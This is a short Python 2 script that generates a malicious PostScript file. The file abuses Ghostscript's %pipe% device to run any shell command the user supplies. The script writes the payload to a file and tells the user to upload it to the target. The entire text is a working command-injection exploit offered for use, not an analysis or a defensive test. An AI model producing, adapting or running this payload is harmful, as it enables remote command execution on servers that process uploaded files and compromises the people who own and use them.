# python 2
import sys

def genareate_payload(_cmd,_filename):

	_payload = """#copies 3 def\n(%pipe%/tmp/;{}) (r) file showpage 0 quit""".format(_cmd)
	f = open(_filename,"w+").write(_payload)
	return True

def main():
	if len(sys.argv) < 3:
		print "Usage: python payload_gen.py <CMD> <Exploit-File-Name>"
		exit()
	_cmd = sys.argv[1]
	_filename = sys.argv[2]
	genareate_payload(_cmd,_filename)
	print "Generating malicious payload successfully, upload it to your target"

if __name__ == "__main__":
	main()
